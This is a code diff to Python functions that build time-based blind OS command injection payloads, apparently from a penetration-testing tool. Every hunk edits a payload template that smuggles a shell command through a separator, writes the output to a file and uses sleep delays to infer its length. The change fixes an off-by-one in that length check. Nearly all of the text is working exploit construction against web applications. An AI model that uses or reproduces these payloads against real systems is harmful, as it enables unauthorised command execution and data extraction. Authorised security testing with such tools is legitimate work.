@@ -71,7 +71,7 @@ def decision_alter_shell(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_meth
     payload = (separator + " "
 	      "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + separator + " "
 	      # Find the length of the output, using readline().
-	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ separator + " "
+	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\")"+ separator + " "
 	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + separator  + " "
 	      "then $(python -c \"import time;time.sleep(0)\")"+ separator + " "
 	      "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ separator + " "
@@ -88,7 +88,7 @@ def decision_alter_shell(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_meth
 	      "$(python -c \"import time;time.sleep(0)\") " + separator + " "
 	      "str=$(echo "+ TAG + " > " + OUTPUT_TEXTFILE + ") " + separator + " "
 	      # Find the length of the output, using readline().
-	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + separator + " "
+	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\") " + separator + " "
 	      "[ " + str(j) + " -eq ${str1} ] " + separator + " "
 	      "$(python -c \"import time;time.sleep("+ str(delay) +")\") "
 	      )
@@ -99,7 +99,7 @@ def decision_alter_shell(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_meth
     payload = (separator + " "
 	      "echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
 	      # Find the length of the output, using readline().
-	      "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
+	      "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\") ] " + separator + " "
 	      "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
 	      ) 
   else:
@@ -156,7 +156,7 @@ def cmd_execution_alter_shell(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request
     payload = (separator + " "
 	      "str=$("+ cmd + "| tr '\n' ' ' > " + OUTPUT_TEXTFILE + ")" + separator + " "
 	      # Find the length of the output, using readline().
-	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ separator + " "
+	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\")"+ separator + " "
 	      "if [ \"" + str(j) + "\" != ${str1} ]; " +
 	      "then $(python -c \"import time;time.sleep(0)\")"+ separator + " "
 	      "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ separator + " "
@@ -173,7 +173,7 @@ def cmd_execution_alter_shell(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request
 	      "$(python -c \"import time;time.sleep(0)\") " +  separator + " "
 	      "str=$(\""+cmd+"\" > " + OUTPUT_TEXTFILE +") " +  separator + " "
 	      # Find the length of the output, using readline().
-	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " +  separator + " "
+	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\") " +  separator + " "
 	      "[ " + str(j) + " -eq ${str1} ] " +  separator + " "
 	      "$(python -c \"import time;time.sleep("+ str(delay) +")\") "
 	      )
@@ -184,7 +184,7 @@ def cmd_execution_alter_shell(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request
     payload = (separator + " "
 	      "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
 	      # Find the length of the output, using readline().
-	      "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
+	      "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\") ] " + separator + " "
 	      "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
 	      ) 		    
   else:
